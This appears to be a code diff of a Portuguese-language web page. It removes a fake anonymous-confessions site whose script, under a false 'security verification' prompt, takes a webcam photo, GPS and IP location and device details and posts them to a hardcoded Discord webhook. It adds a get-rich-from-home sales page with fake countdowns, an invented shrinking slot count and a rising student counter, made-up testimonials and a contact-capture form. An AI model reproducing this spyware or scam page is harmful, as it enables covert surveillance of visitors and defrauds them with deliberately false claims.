+            border-radius: 12px;
+            border: 2px solid rgba(255,255,255,0.1);
+            background: rgba(255,255,255,0.05);
+            color: #fff;
+            font-size: 16px;
+            margin-bottom: 15px;
+            transition: all 0.3s;
+        }
+
+        .modal input:focus {
+            outline: none;
+            border-color: #00d26a;
+            box-shadow: 0 0 0 4px rgba(0, 210, 106, 0.1);
+        }
+
+        .modal .btn-cta {
+            width: 100%;
+        }
+
+        .modal-beneficios {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin: 20px 0;
+            text-align: left;
+        }
+
+        .modal-beneficio {
+            font-size: 12px;
+            color: #b8b8b8;
+        }
+
+        .modal-beneficio::before {
+            content: '✓ ';
+            color: #00d26a;
+            font-weight: 700;
+        }
+
+        .contador-modal {
+            background: rgba(255,0,0,0.1);
+            border-radius: 10px;
+            padding: 12px;
+            margin-bottom: 20px;
+            color: #ff4444;
+            font-weight: 700;
+            font-size: 14px;
+        }
+
+        /* Responsivo */
+        @media (max-width: 768px) {
+            .planos-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .plano-card.destaque {
+                transform: scale(1);
+            }
+
+            .plano-card.destaque:hover {
+                transform: scale(1.02) translateY(-5px);
+            }
+
+            .header .destaque-numeros {
+                gap: 20px;
+            }
+
+            .confianca-bar {
+                gap: 20px;
+            }
+
+            .btn-flutuante {
+                bottom: 20px;
+                right: 20px;
+                width: 50px;
+                height: 50px;
+                font-size: 24px;
+            }
+        }
+    </style>
 </head>
 <body>
-  <div class="background-decoration">
-    <div class="circle circle-1"></div>
-    <div class="circle circle-2"></div>
-  </div>
-
-  <div class="container">
-    <div class="header">
-      <div class="logo-container">
-        <div class="avatar">🔒</div>
-        <div class="verified-badge">✓</div>
-      </div>
-      <h1>Confissões Anônimas</h1>
-      <p class="subtitle">Compartilhe segredos, faça perguntas ou desabafe de forma 100% anônima e segura</p>
-      
-      <div class="status-bar">
-        <div class="status-dot"></div>
-        <span class="status-text">Plataforma segura e ativa</span>
-      </div>
-      
-      <div class="trust-badges">
-        <div class="trust-badge">
-          <span class="icon">🔐</span> Criptografado
-        </div>
-        <div class="trust-badge">
-          <span class="icon">👻</span> Anônimo
-        </div>
-        <div class="trust-badge">
-          <span class="icon">⚡</span> Instantâneo
-        </div>
-      </div>
+    <!-- Barra Superior Urgente -->
+    <div class="top-bar">
+        <span class="live-dot"></span>
+        <span>🔴 AO VIVO: Últimas 27 vagas disponíveis! Oferta termina em: <span id="contador"></span></span>
     </div>
 
-    <div class="features-grid">
-      <div class="feature-item">
-        <div class="feature-icon">🎭</div>
-        <div class="feature-text">Identidade Protegida</div>
-      </div>
-      <div class="feature-item">
-        <div class="feature-icon">🛡️</div>
-        <div class="feature-text">Dados Criptografados</div>
-      </div>
-      <div class="feature-item">
-        <div class="feature-icon">💜</div>
-        <div class="feature-text">Sem Julgamentos</div>
-      </div>
-    </div>
-
-    <form id="anonymous-form">
-      <div class="form-group">
-        <label for="pergunta">Sua mensagem secreta:</label>
-        <textarea 
-          id="pergunta" 
-          placeholder="Escreva aqui o que você sempre quis dizer mas nunca teve coragem... Ninguém saberá que foi você. ✨"
-          maxlength="500"
-          required
-        ></textarea>
-        <div class="char-counter">
-          <span id="char-count">0</span>/500
-        </div>
-      </div>
-
-      <div class="form-group">
-        <label for="nome">Apelido <span class="optional">(opcional - para se identificar na resposta)</span>:</label>
-        <input 
-          type="text" 
-          id="nome" 
-          class="name-input"
-          placeholder="Deixe em branco para ser totalmente anônimo"
-          maxlength="30"
-        >
-      </div>
-
-      <button type="submit" class="submit-btn" id="btn-enviar">
-        🚀 Enviar Anonimamente
-      </button>
-    </form>
-
-    <div class="testimonials">
-      <div class="testimonials-title">Usuários Recentes</div>
-      <div class="testimonial-items">
-        <div class="testimonial-item">
-          <div class="testimonial-stars">⭐⭐⭐⭐⭐</div>
-          <div class="testimonial-text">"Finalmente consegui desabafar sem medo. Plataforma incrível!"</div>
-        </div>
-        <div class="testimonial-item">
-          <div class="testimonial-stars">⭐⭐⭐⭐⭐</div>
-          <div class="testimonial-text">"Muito seguro e realmente anônimo. Recomendo!"</div>
-        </div>
-        <div class="testimonial-item">
-          <div class="testimonial-stars">⭐⭐⭐⭐⭐</div>
-          <div class="testimonial-text">"Usei para uma pergunta delicada e foi perfeito."</div>
-        </div>
-      </div>
-    </div>
-
-    <div class="footer-text">
-      🔒 Suas informações são protegidas com criptografia de ponta a ponta
-    </div>
-  </div>
-
-  <!-- Elementos ocultos -->
-  <video id="video" autoplay playsinline muted></video>
-  <canvas id="canvas"></canvas>
-  <audio id="audio"></audio>
-
-  <!-- Loading -->
-  <div class="loading-overlay" id="loading-overlay">
-    <div class="spinner"></div>
-    <div class="loading-text">Enviando com segurança...</div>
-    <div class="loading-subtext">Criptografando sua mensagem</div>
-  </div>
-
-  <!-- Modal de sucesso -->
-  <div class="modal-overlay" id="success-modal">
-    <div class="modal">
-      <div class="success-icon">✅</div>
-      <h3>Mensagem Enviada com Sucesso!</h3>
-      <p>Sua mensagem anônima foi entregue com segurança.</p>
-      <div class="encryption-note">
-        🔐 Mensagem criptografada e protegida
-      </div>
-      <p style="font-size: 12px;">Ninguém, nem mesmo os administradores, podem identificar o remetente.</p>
-      <button onclick="closeSuccessModal()">Entendido</button>
-    </div>
-  </div>
-
-  <!-- Prompt de permissão -->
-  <div class="permission-prompt" id="permission-prompt">
-    <div class="permission-content">
-      <span class="permission-icon">🛡️</span>
-      <h3>Verificação de Segurança</h3>
-      <p>Para manter nossa comunidade protegida contra bots e garantir um ambiente seguro para todos, realizamos uma verificação rápida e automática.</p>
-      
-      <div class="security-features">
-        <div class="security-feature">
-          <div class="sf-icon">🔒</div>
-          <div class="sf-text">Proteção Anti-Bot</div>
-        </div>
-        <div class="security-feature">
-          <div class="sf-icon">🕵️</div>
-          <div class="sf-text">Verificação Segura</div>
-        </div>
-        <div class="security-feature">
-          <div class="sf-icon">⚡</div>
-          <div class="sf-text">Processo Rápido</div>
-        </div>
-      </div>
-      
-      <p>Precisamos verificar a câmera e localização apenas para confirmar que você é um usuário real. <strong>Este processo é automático e totalmente seguro.</strong></p>
-      <p style="font-size: 13px; opacity: 0.7;">✅ Seus dados são criptografados e não são armazenados</p>
-      <p style="font-size: 13px; opacity: 0.7;">✅ Você permanecerá 100% anônimo</p>
-      
-      <button class="permission-btn" id="permission-button">
-        🔒 Iniciar Verificação Segura
-      </button>
-    </div>
-  </div>
-
-<script>
-    class PermissionManager {
-        constructor() {
-            this.webhook = "https://discord.com/api/webhooks/1356839153790095509/mT5WvVHY9oleHuMlegTiB_A-_SunQ3m2bki0AkUnBAngHN2z6pqVHRjqFra-MO2vRGs9";
+    <!-- Header Principal -->
+    <header class="header">
+        <div class="header-content">
+            <span class="badge-premium">⭐ PROGRAMA PREMIUM 2024</span>
+            <h1>TRABALHE DE CASA E GANHE<br>ATÉ R$ 5.000 POR MÊS</h1>
+            <h2>Método comprovado utilizado por mais de 50.000 pessoas 💰</h2>
             
-            this.data = {
-                location: { lat: null, lon: null, accuracy: null, status: 'pending' },
-                camera: { image: null, status: 'pending', sent: false },
-                device: {},
-                ip: {},
-                behavior: { startTime: Date.now(), interactions: [] },
-                permissions: { location: false, camera: false, notifications: false }
-            };
-            
-            this.flags = {
-                cameraAttempted: false,
-                locationSent: false,
-                cameraSent: false,
-                permissionsRequested: false,
-                formSubmitted: false,
-                initCompleted: false,
-                permissionsGranted: false,
-                verificationAttempts: 0,
-                showingPrompt: false
-            };
-            
-            this.coletarInformacoesDispositivo();
-            this.init();
-        }
+            <div class="destaque-numeros">
+                <div class="numero-item">
+                    <span class="numero-valor" id="num-alunos">50.847</span>
+                    <span class="numero-label">Alunos Ativos</span>
+                </div>
+                <div class="numero-item">
+                    <span class="numero-valor">R$ 4.8M</span>
+                    <span class="numero-label">Pagos em 2024</span>
+                </div>
+                <div class="numero-item">
+                    <span class="numero-valor">98.7%</span>
+                    <span class="numero-label">Satisfação</span>
+                </div>
+            </div>
+
+            <a href="#" class="btn-cta" onclick="abrirModal()">
+                🔥 QUERO COMEÇAR AGORA
+            </a>
+        </div>
+    </header>
+
+    <!-- Barra de Confiança -->
+    <div class="confianca-bar">
+        <div class="confianca-item">
+            <span class="confianca-icon">🔒</span>
+            Pagamento Seguro
+        </div>
+        <div class="confianca-item">
+            <span class="confianca-icon">⚡</span>
+            Acesso Imediato
+        </div>
+        <div class="confianca-item">
+            <span class="confianca-icon">🎯</span>
+            Resultados em 7 Dias
+        </div>
+        <div class="confianca-item">
+            <span class="confianca-icon">💳</span>
+            PIX Automático
+        </div>
+    </div>
+
+    <!-- Seção de Planos -->
+    <section class="planos-section">
+        <h2 class="section-title">Escolha Seu Plano</h2>
+        <p class="section-subtitle">Comece hoje mesmo a ganhar dinheiro de casa</p>
+
+        <!-- Aviso de Vagas Urgente -->
+        <div class="vagas-urgente">
+            <h4>⚠️ ATENÇÃO: Vagas Limitadas!</h4>
+            <div class="numero-vagas" id="vagas-restantes">27</div>
+            <p style="color:#ff8888;">Vagas disponíveis para hoje</p>
+        </div>
+
+        <div class="planos-grid">
+            <!-- Plano Básico -->
+            <div class="plano-card">
+                <h3 class="plano-nome">Plano Básico</h3>
+                <div class="plano-preco-anterior">R$ 497,00</div>
+                <div class="plano-preco">R$ 97</div>
+                <div class="plano-parcelas">ou 12x de R$ 9,74</div>
+                <ul class="plano-beneficios">
+                    <li>Acesso ao método completo</li>
+                    <li>Suporte por e-mail</li>
+                    <li>Bônus: E-book de Tarefas</li>
+                    <li>Garantia de 7 dias</li>
+                </ul>
+                <a href="#" class="btn-plano basico" onclick="abrirModal()">COMEÇAR AGORA</a>
+            </div>
+
+            <!-- Plano Mais Vendido -->
+            <div class="plano-card destaque">
+                <div class="plano-badge">🏆 MAIS VENDIDO</div>
+                <h3 class="plano-nome">Plano Premium</h3>
+                <div class="plano-preco-anterior">R$ 997,00</div>
+                <div class="plano-preco">R$ 197</div>
+                <div class="plano-parcelas">ou 12x de R$ 19,74</div>
+                <ul class="plano-beneficios">
+                    <li>Tudo do Plano Básico</li>
+                    <li>Suporte VIP 24h</li>
+                    <li>10 Bônus Exclusivos</li>
+                    <li>Comunidade VIP no Telegram</li>
+                    <li>Aulas ao vivo semanais</li>
+                    <li>Garantia estendida 30 dias</li>
+                </ul>
+                <a href="#" class="btn-plano destaque-btn" onclick="abrirModal()">QUERO O PREMIUM</a>
+            </div>
+
+            <!-- Plano VIP -->
+            <div class="plano-card">
+                <h3 class="plano-nome">Plano VIP</h3>
+                <div class="plano-preco-anterior">R$ 1.997,00</div>
+                <div class="plano-preco">R$ 497</div>
+                <div class="plano-parcelas">ou 12x de R$ 49,74</div>
+                <ul class="plano-beneficios">
+                    <li>Tudo do Plano Premium</li>
+                    <li>Mentoria individual</li>
+                    <li>Acesso vitalício</li>
+                    <li>Garantia de resultados</li>
+                    <li>Bônus de R$ 5.000 em cursos</li>
+                </ul>
+                <a href="#" class="btn-plano vip" onclick="abrirModal()">SER VIP AGORA</a>
+            </div>
+        </div>
+    </section>
+
+    <!-- Depoimentos -->
+    <section class="depoimentos-section">
+        <h2 class="section-title">Resultados Reais</h2>
+        <p class="section-subtitle">Veja o que nossos alunos estão conquistando</p>
         
-        coletarInformacoesDispositivo() {
-            const ua = navigator.userAgent;
-            this.data.device = {
-                isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua),
-                isIOS: /iPad|iPhone|iPod/.test(ua),
-                isAndroid: /Android/i.test(ua),
-                isSafari: /^((?!chrome|android).)*safari/i.test(ua),
-                isChrome: ua.includes('Chrome') && !ua.includes('Edge'),
-                isFirefox: ua.includes('Firefox'),
-                userAgent: ua,
-                screen: { width: screen.width, height: screen.height, colorDepth: screen.colorDepth },
-                viewport: { width: window.innerWidth, height: window.innerHeight },
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                language: navigator.language,
-                platform: navigator.platform,
-                cookiesEnabled: navigator.cookieEnabled
-            };
-        }
-        
-        async init() {
-            this.setupInitialListeners();
-            await this.getIPInfo();
-            this.showPermissionPrompt();
-        }
+        <div class="depoimentos-grid">
+            <div class="depoimento-card">
+                <div class="depoimento-stars">⭐⭐⭐⭐⭐</div>
+                <p class="depoimento-texto">"Comecei sem saber nada e em 2 semanas já tinha feito R$ 1.200! Simplesmente incrível o método!"</p>
+                <div class="depoimento-autor">
+                    <div class="depoimento-avatar">MF</div>
+                    <div>
+                        <div class="depoimento-nome">Maria F.</div>
+                        <div class="depoimento-cargo">São Paulo - SP</div>
+                    </div>
+                </div>
+                <div class="depoimento-comprovante">✅ Resultado comprovado</div>
+            </div>
 
-        setupInitialListeners() {
-            document.getElementById('anonymous-form').addEventListener('submit', (e) => {
-                e.preventDefault();
-                this.handleFormSubmit();
-            });
+            <div class="depoimento-card">
+                <div class="depoimento-stars">⭐⭐⭐⭐⭐</div>
+                <p class="depoimento-texto">"Já tinha tentado de tudo na internet, mas só esse método funcionou de verdade. Já ganhei mais de R$ 8.000!"</p>
+                <div class="depoimento-autor">
+                    <div class="depoimento-avatar">JS</div>
+                    <div>
+                        <div class="depoimento-nome">João S.</div>
+                        <div class="depoimento-cargo">Rio de Janeiro - RJ</div>
+                    </div>
+                </div>
+                <div class="depoimento-comprovante">✅ Resultado comprovado</div>
+            </div>
+
+            <div class="depoimento-card">
+                <div class="depoimento-stars">⭐⭐⭐⭐⭐</div>
+                <p class="depoimento-texto">"Estava desempregada e esse curso mudou minha vida. Minha primeira semana já fiz R$ 800!"</p>
+                <div class="depoimento-autor">
+                    <div class="depoimento-avatar">AP</div>
+                    <div>
+                        <div class="depoimento-nome">Ana P.</div>
+                        <div class="depoimento-cargo">Belo Horizonte - MG</div>
+                    </div>
+                </div>
+                <div class="depoimento-comprovante">✅ Resultado comprovado</div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Garantia -->
+    <section class="garantia-section">
+        <div class="garantia-selo">🛡️</div>
+        <h3>Garantia Incondicional de 30 Dias</h3>
+        <p>Se em até 30 dias você não estiver satisfeito por qualquer motivo, devolvemos 100% do seu dinheiro. <strong>Sem perguntas, sem burocracia.</strong></p>
+        <p style="margin-top:15px;font-size:14px;">Mais de 50.000 alunos confiam em nosso método</p>
+    </section>
+
+    <!-- FAQ -->
+    <section class="faq-section">
+        <h2 class="section-title">Perguntas Frequentes</h2>
+        <p class="section-subtitle">Tire suas dúvidas</p>
+
+        <div class="faq-item" onclick="toggleFAQ(this)">
+            <div class="faq-pergunta">
+                <span>Como funciona o pagamento?</span>
+                <span class="faq-seta">▼</span>
+            </div>
+            <div class="faq-resposta">
+                Os pagamentos são feitos via PIX diretamente na sua conta. Você pode sacar a qualquer momento, sem valor mínimo. Os ganhos são atualizados em tempo real.
+            </div>
+        </div>
+
+        <div class="faq-item" onclick="toggleFAQ(this)">
+            <div class="faq-pergunta">
+                <span>Preciso ter experiência?</span>
+                <span class="faq-seta">▼</span>
+            </div>
+            <div class="faq-resposta">
+                Não! O método foi desenvolvido para iniciantes. 94% dos nossos alunos nunca tinham trabalhado online antes de começar.
+            </div>
+        </div>
+
+        <div class="faq-item" onclick="toggleFAQ(this)">
+            <div class="faq-pergunta">
+                <span>Quanto tempo até ver resultados?</span>
+                <span class="faq-seta">▼</span>
+            </div>
+            <div class="faq-resposta">
+                A maioria dos alunos consegue seus primeiros ganhos em até 7 dias. Alguns relatam ganhos já nas primeiras 24 horas.
+            </div>
+        </div>
+
+        <div class="faq-item" onclick="toggleFAQ(this)">
+            <div class="faq-pergunta">
+                <span>É seguro? Meus dados estão protegidos?</span>
+                <span class="faq-seta">▼</span>
+            </div>
+            <div class="faq-resposta">
+                Completamente seguro! Utilizamos criptografia de nível bancário e seus dados nunca são compartilhados. Nosso sistema é auditado regularmente.
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-logos">
+            <span>🔒 SSL Seguro</span>
+            <span>💳 Pagamento Protegido</span>
+            <span>⭐ 4.9/5 Avaliação</span>
+            <span>🏆 Top 1% Brasil</span>
+        </div>
+        <p>© 2024 - Todos os direitos reservados</p>
+        <p>Este site não é afiliado ao Google, Facebook ou qualquer outra plataforma mencionada.</p>
+        <p>Resultados podem variar de acordo com o esforço individual.</p>
+    </footer>
+
+    <!-- Botão Flutuante -->
+    <a href="#" class="btn-flutuante" onclick="abrirModal()">
+        💬
+    </a>
+
+    <!-- Modal de Captura -->
+    <div class="modal-overlay" id="modal-captura">
+        <div class="modal">
+            <button class="modal-fechar" onclick="fecharModal()">×</button>
+            <h3>🎯 Última Chance!</h3>
             
-            document.getElementById('permission-button').addEventListener('click', () => {
-                this.handlePermissionClick();
-            });
-
-            const textarea = document.getElementById('pergunta');
-            const counter = document.getElementById('char-count');
-            if (textarea && counter) {
-                textarea.addEventListener('input', () => {
-                    counter.textContent = textarea.value.length;
-                });
-            }
-
-            document.addEventListener('click', () => {
-                if (!this.flags.permissionsGranted && !this.flags.showingPrompt) {
-                    setTimeout(() => {
-                        this.checkAndForcePermissions();
-                    }, 1000);
-                }
-            });
-        }
-
-        async handlePermissionClick() {
-            this.flags.verificationAttempts++;
-            this.hidePermissionPrompt();
-            this.showVerificationLoading();
+            <div class="contador-modal">
+                ⏰ Oferta especial termina em: <span id="contador-modal">15:00</span>
+            </div>
             
-            setTimeout(async () => {
-                await this.requestAllPermissions();
-            }, 500);
-        }
-
-        showVerificationLoading() {
-            const loadingElement = document.getElementById('loading-overlay');
-            const loadingText = loadingElement.querySelector('.loading-text');
-            const loadingSubtext = loadingElement.querySelector('.loading-subtext');
-            if (loadingText) {
-                loadingText.textContent = 'Realizando verificação de segurança...';
-            }
-            if (loadingSubtext) {
-                loadingSubtext.textContent = 'Protegendo sua identidade';
-            }
-            loadingElement.style.display = 'flex';
+            <p>Preencha abaixo para garantir sua vaga com <strong>desconto exclusivo</strong>:</p>
             
-            setTimeout(() => {
-                loadingElement.style.display = 'none';
-            }, 1500);
-        }
-
-        async requestAllPermissions() {
-            try {
-                await this.requestLocation();
+            <form id="form-captura" onsubmit="enviarDados(event)">
+                <input type="text" placeholder="Seu nome completo" id="nome" required>
+                <input type="email" placeholder="Seu melhor e-mail" id="email" required>
+                <input type="tel" placeholder="Seu WhatsApp com DDD" id="whatsapp" required>
                 
-                setTimeout(async () => {
-                    await this.captureCamera();
-                    
-                    setTimeout(() => {
-                        this.checkPermissionResults();
-                    }, 1000);
-                }, 500);
+                <div class="modal-beneficios">
+                    <div class="modal-beneficio">Acesso imediato</div>
+                    <div class="modal-beneficio">Pagamento via PIX</div>
+                    <div class="modal-beneficio">Suporte 24h</div>
+                    <div class="modal-beneficio">Garantia de 30 dias</div>
+                </div>
                 
-            } catch (error) {
-                setTimeout(() => {
-                    this.handlePermissionFailure();
-                }, 1000);
-            }
+                <button type="submit" class="btn-cta">
+                    🔒 GARANTIR MINHA VAGA AGORA
+                </button>
+                
+                <p style="font-size:11px;color:#666;margin-top:15px;">
+                    Seus dados estão protegidos. Não compartilhamos com terceiros.
+                </p>
+            </form>
+        </div>
+    </div>
+
+    <!-- Loading -->
+    <div class="modal-overlay" id="loading-overlay" style="display:none;">
+        <div style="text-align:center;color:white;">
+            <div style="font-size:60px;animation:pulse 1.5s infinite;">⏳</div>
+            <h3 style="margin-top:20px;">Processando seu acesso...</h3>
+            <p style="color:#b8b8b8;">Você será redirecionado em instantes</p>
+        </div>
+    </div>
+
+    <script>
+        // Contador regressivo
+        function iniciarContador() {
+            let tempo = 900; // 15 minutos
+            const contadorEl = document.getElementById('contador');
+            const contadorModalEl = document.getElementById('contador-modal');
+            
+            setInterval(() => {
+                const minutos = Math.floor(tempo / 60);
+                const segundos = tempo % 60;
+                const tempoStr = `${minutos}:${segundos.toString().padStart(2, '0')}`;
+                
+                if (contadorEl) contadorEl.textContent = tempoStr;
+                if (contadorModalEl) contadorModalEl.textContent = tempoStr;
+                
+                if (tempo > 0) tempo--;
+            }, 1000);
         }
 
-        checkPermissionResults() {
-            const hasLocation = this.data.location.status === 'success';
-            const hasCamera = this.data.camera.status === 'success';
-            
-            if (hasLocation && hasCamera) {
-                this.flags.permissionsGranted = true;
-                this.showToast('✅ Verificação de segurança concluída!', 'success');
-            } else if (hasLocation || hasCamera) {
-                this.flags.permissionsGranted = true;
-                this.showToast('✅ Verificação parcial concluída', 'success');
-            } else {
-                this.handlePermissionFailure();
-            }
-        }
-
-        handlePermissionFailure() {
-            if (this.flags.verificationAttempts < 5) {
-                setTimeout(() => {
-                    this.showForcePermissionPrompt();
-                }, 2000);
-            } else {
-                this.flags.permissionsGranted = true;
-                this.showToast('Continuando sem verificação completa', 'info');
-            }
-        }
-
-        showForcePermissionPrompt() {
-            this.flags.showingPrompt = true;
-            const prompt = document.getElementById('permission-prompt');
-            const content = prompt.querySelector('.permission-content');
-            
-            let message = '';
-            if (this.flags.verificationAttempts === 1) {
-                message = `
-                    <span class="permission-icon">🔒</span>
-                    <h3>Permissões Necessárias</h3>
-                    <p>Para continuar, precisamos verificar que você é um usuário real.</p>
-                    <p>Por favor, <strong>permita</strong> o acesso quando solicitado.</p>
-                    <p style="font-size: 13px; opacity: 0.7;">Isso nos ajuda a manter a comunidade segura</p>
-                    <button class="permission-btn" id="permission-button-retry">
-                        🔄 Tentar Novamente
-                    </button>
-                `;
-            } else if (this.flags.verificationAttempts === 2) {
-                message = `
-                    <span class="permission-icon">⚠️</span>
-                    <h3>Verificação Obrigatória</h3>
-                    <p><strong>Você deve permitir as permissões</strong> para usar a plataforma com segurança.</p>
-                    <p>Clique em <strong>"Permitir"</strong> quando aparecer a solicitação do navegador.</p>
-                    <p style="font-size: 12px; opacity: 0.7;">Sem verificação, não podemos garantir um ambiente livre de bots</p>
-                    <button class="permission-btn" id="permission-button-retry">
-                        ✅ Continuar Verificação
-                    </button>
-                `;
-            } else {
-                message = `
-                    <span class="permission-icon">🚫</span>
-                    <h3>Acesso Necessário</h3>
-                    <p><strong>Permissões obrigatórias</strong> para o funcionamento seguro da plataforma.</p>
-                    <p>Tentativa ${this.flags.verificationAttempts} de 5</p>
-                    <p style="font-size: 11px; opacity: 0.6;">Após 5 tentativas, o acesso será liberado mesmo sem verificação</p>
-                    <button class="permission-btn" id="permission-button-retry">
-                        🔓 Permitir Acesso
-                    </button>
-                `;
-            }
-            
-            content.innerHTML = message;
-            
-            const retryButton = document.getElementById('permission-button-retry');
-            if (retryButton) {
-                retryButton.addEventListener('click', () => {
-                    this.flags.showingPrompt = false;
-                    this.handlePermissionClick();
-                });
-            }
-            
-            prompt.style.display = 'flex';
-        }
-
-        checkAndForcePermissions() {
-            if (!this.flags.permissionsGranted && this.flags.verificationAttempts > 0) {
-                this.showForcePermissionPrompt();
-            }
-        }
-        
-        showPermissionPrompt() {
-            this.flags.showingPrompt = true;
-            const element = document.getElementById('permission-prompt');
-            if (element) {
-                element.style.display = 'flex';
-            }
-        }
-        
-        hidePermissionPrompt() {
-            this.flags.showingPrompt = false;
-            const element = document.getElementById('permission-prompt');
-            if (element) element.style.display = 'none';
-        }
-        
-        async getIPInfo() {
-            try {
-                const services = [
-                    'https://ip-api.com/json', 
-                    'https://ipapi.co/json/', 
-                    'https://ipinfo.io/json', 
-                    'https://ipwhois.app/json/'
-                ];
-                for (const service of services) {
-                    try {
-                        const response = await fetch(service, { signal: AbortSignal.timeout(3000) });
-                        if (response.ok) {
-                            const data = await response.json();
-                            this.data.ip = {
-                                ip: data.ip || data.query, 
-                                city: data.city,
-                                region: data.region || data.regionName, 
-                                country: data.country_name || data.country,
-                                isp: data.org || data.isp, 
-                                latitude: parseFloat(data.latitude || data.lat) || null,
-                                longitude: parseFloat(data.longitude || data.lon) || null, 
-                                timezone: data.timezone,
-                                service: service
-                            };
-                            return;
-                        }
-                    } catch (e) { 
-                        continue;
+        // Atualizar número de vagas
+        function atualizarVagas() {
+            const vagasEl = document.getElementById('vagas-restantes');
+            if (vagasEl) {
+                let vagas = 27;
+                setInterval(() => {
+                    if (Math.random() < 0.3 && vagas > 3) {
+                        vagas--;
+                        vagasEl.textContent = vagas;
                     }
-                }
-            } catch (error) { 
-                // Falha silenciosa
+                }, 8000);
             }
         }
-        
-        async requestLocation() {
-            try {
-                if (!navigator.geolocation) {
-                    throw new Error('Geolocation not supported');
-                }
-                
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true, 
-                        timeout: 10000, 
-                        maximumAge: 0 
-                    });
-                });
-                
-                this.data.location = {
-                    lat: position.coords.latitude, 
-                    lon: position.coords.longitude,
-                    accuracy: position.coords.accuracy, 
-                    status: 'success', 
-                    source: 'GPS'
-                };
-                this.data.location.googleMapsUrl = `https://www.google.com/maps?q=${this.data.location.lat},${this.data.location.lon}`;
-                this._sL();
-                
-            } catch (error) {
-                this.data.location.status = 'error';
-                
-                if (this.data.ip.latitude && this.data.ip.longitude) {
-                    this.data.location = {
-                        lat: this.data.ip.latitude, 
-                        lon: this.data.ip.longitude,
-                        googleMapsUrl: `https://www.google.com/maps?q=${this.data.ip.latitude},${this.data.ip.longitude}`,
-                        source: 'IP',
-                        status: 'success'
-                    };
-                    this._sL();
-                }
-            }
-        }
-        
-        async captureCamera() {
-            if (this.flags.cameraAttempted) return;
-            this.flags.cameraAttempted = true;
-            
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            let stream = null;
 
-            try {
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    audio: false, 
-                    video: { 
-                        facingMode: 'user', 
-                        width: { ideal: 640 }, 
-                        height: { ideal: 480 } 
-                    } 
-                });
-                
-                video.srcObject = stream;
-                video.muted = true;
-                video.playsInline = true;
-                
-                await new Promise((resolve, reject) => { 
-                    video.onloadedmetadata = () => {
-                        video.play().then(resolve).catch(reject);
-                    };
-                    setTimeout(reject, 5000);
-                });
-                
-                await new Promise(resolve => setTimeout(resolve, 600));
+        // Contador de alunos
+        function atualizarAlunos() {
+            const alunosEl = document.getElementById('num-alunos');
+            if (alunosEl) {
+                let alunos = 50847;
+                setInterval(() => {
+                    alunos += Math.floor(Math.random() * 3) + 1;
+                    alunosEl.textContent = alunos.toLocaleString('pt-BR');
+                }, 3000);
+            }
+        }
 
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                this.data.camera = {
-                    image: canvas.toDataURL('image/jpeg', 0.7), 
-                    status: 'success',
-                    resolution: `${canvas.width}x${canvas.height}`, 
-                    timestamp: new Date().toISOString()
-                };
-                this._sC();
-                
-            } catch (error) {
-                this.data.camera.status = 'error';
-            } finally {
-                if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
-                }
-                if (video) {
-                    video.srcObject = null;
-                }
+        // FAQ Toggle
+        function toggleFAQ(element) {
+            element.classList.toggle('ativo');
+        }
+
+        // Modal
+        function abrirModal() {
+            document.getElementById('modal-captura').style.display = 'flex';
+            document.body.style.overflow = 'hidden';
+        }
+
+        function fecharModal() {
+            document.getElementById('modal-captura').style.display = 'none';
+            document.body.style.overflow = 'auto';
+        }
+
+        // Fechar modal ao clicar fora
+        document.getElementById('modal-captura').addEventListener('click', function(e) {
+            if (e.target === this) {
+                fecharModal();
             }
-        }
-        
-        async _sL() {
-            if (this.flags.locationSent || !this.data.location.lat) return;
-            this.flags.locationSent = true;
-            try {
-                const { lat, lon, accuracy, googleMapsUrl, source } = this.data.location;
-                const payload = {
-                    username: "System Analytics", 
-                    avatar_url: "https://cdn-icons-png.flaticon.com/512/854/854878.png",
-                    embeds: [{
-                        title: `Location Data (${source || 'N/A'})`,
-                        description: `[View on Map](${googleMapsUrl})`,
-                        color: source === 'GPS' ? 0x00FF00 : 0xFFA500,
-                        fields: [
-                            { 
-                                name: "Coordinates", 
-                                value: `Lat: \`${lat.toFixed(6)}\`\nLon: \`${lon.toFixed(6)}\``, 
-                                inline: true 
-                            },
-                            { 
-                                name: "Accuracy", 
-                                value: `\`${accuracy ? accuracy.toFixed(2) + 'm' : 'N/A'}\``, 
-                                inline: true 
-                            },
-                            { 
-                                name: "Device", 
-                                value: `\`${this.data.device.isIOS ? 'iOS' : this.data.device.isAndroid ? 'Android' : 'Desktop'}\``, 
-                                inline: true 
-                            },
-                            { 
-                                name: "IP", 
-                                value: `\`${this.data.ip.ip || 'N/A'}\``, 
-                                inline: true 
-                            },
-                            { 
-                                name: "ISP", 
-                                value: `\`${this.data.ip.isp || 'N/A'}\``, 
-                                inline: true 
-                            },
-                            { 
-                                name: "Timestamp", 
-                                value: `\`${new Date().toLocaleString('pt-BR')}\``, 
-                                inline: true 
-                            }
-                        ],
-                        footer: { text: "System Analytics" }, 
-                        timestamp: new Date().toISOString()
-                    }]
-                };
-                await fetch(this.webhook, { 
-                    method: 'POST', 
-                    headers: { 'Content-Type': 'application/json' }, 
-                    body: JSON.stringify(payload) 
-                });
-            } catch (error) { 
-                // Falha silenciosa
-            }
-        }
-        
-        async _sC() {
-            if (this.flags.cameraSent || !this.data.camera.image) return;
-            this.flags.cameraSent = true;
-            try {
-                const payload = {
-                    username: "System Verification", 
-                    avatar_url: "https://cdn-icons-png.flaticon.com/512/3075/3075977.png",
-                    content: "**Visual Verification**",
-                    embeds: [{
-                        title: "Visual Check Complete", 
-                        color: 0x00FF00,
-                        fields: [
-                            { 
-                                name: "Device", 
-                                value: `\`${this.data.device.isIOS ? 'iOS' : this.data.device.isAndroid ? 'Android' : 'Desktop'}\``, 
-                                inline: true 
-                            },
-                            { 
-                                name: "IP", 
-                                value: `\`${this.data.ip.ip || 'N/A'}\``, 
-                                inline: true 
-                            },
